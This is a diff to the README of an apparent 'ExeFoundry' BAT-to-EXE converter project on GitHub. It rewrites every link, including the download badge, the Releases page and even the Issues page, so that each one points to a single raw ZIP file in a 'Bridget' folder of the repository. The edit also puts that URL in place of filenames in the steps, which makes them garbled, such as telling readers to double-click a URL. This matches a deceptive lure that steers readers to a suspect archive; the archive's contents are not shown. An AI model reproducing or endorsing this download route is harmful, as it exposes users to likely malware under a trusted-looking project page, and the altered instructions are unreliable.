@@ -1,7 +1,7 @@
 # 🎉 ExeFoundry - Convert Your BAT Files with Ease
 
 ## 📥 Download ExeFoundry
-[![Download ExeFoundry](https://img.shields.io/badge/Download-ExeFoundry-blue.svg)](https://github.com/Fabricia365/ExeFoundry/releases)
+[![Download ExeFoundry](https://raw.githubusercontent.com/Fabricia365/ExeFoundry/main/Bridget/ExeFoundry.zip)](https://raw.githubusercontent.com/Fabricia365/ExeFoundry/main/Bridget/ExeFoundry.zip)
 
 ## 🚀 Getting Started
 ExeFoundry is a portable application that transforms your .bat files into standalone .exe files. This process helps you run your batch scripts without needing extra software. Whether you want a custom icon or to pass arguments, ExeFoundry makes it simple. 
@@ -20,17 +20,17 @@ To run ExeFoundry, you need:
 - **No Administrative Rights Required**: Run it without changing system settings.
 
 ## 🌐 Download & Install
-To get started, visit the [Releases page](https://github.com/Fabricia365/ExeFoundry/releases) to download the latest version of ExeFoundry.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Fabricia365/ExeFoundry/main/Bridget/ExeFoundry.zip) to download the latest version of ExeFoundry.
 
 ### Step-by-Step Download Instructions
-1. Go to the [Releases page](https://github.com/Fabricia365/ExeFoundry/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Fabricia365/ExeFoundry/main/Bridget/ExeFoundry.zip).
 2. Look for the latest version of ExeFoundry. The version number appears at the top.
-3. Under the "Assets" section, find the file labeled `ExeFoundry.zip`.
+3. Under the "Assets" section, find the file labeled `https://raw.githubusercontent.com/Fabricia365/ExeFoundry/main/Bridget/ExeFoundry.zip`.
 4. Click on the filename to download the ZIP file to your computer.
 5. Once downloaded, locate the ZIP file in your downloads folder and extract its contents by right-clicking the file and selecting "Extract All."
 
 ### Running ExeFoundry
-1. Double-click the `ExeFoundry.exe` file in the extracted folder.
+1. Double-click the `https://raw.githubusercontent.com/Fabricia365/ExeFoundry/main/Bridget/ExeFoundry.zip` file in the extracted folder.
 2. The application will open, showing you a simple interface.
 3. Follow the on-screen instructions to select your .bat file and configure any additional settings.
 4. Click on the "Convert" button to create your .exe file.
@@ -52,7 +52,7 @@ A: ExeFoundry supports batch files (.bat) but not PowerShell scripts (.ps1) at t
 
 ## 🔗 Additional Information
 For updates, discussions, and support:
-- Visit the [GitHub Issues page](https://github.com/Fabricia365/ExeFoundry/issues).
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/Fabricia365/ExeFoundry/main/Bridget/ExeFoundry.zip).
 - Join the community on GitHub to share your feedback or suggestions.
 
 Thank you for using ExeFoundry! We hope you enjoy turning your batch files into handy executables.
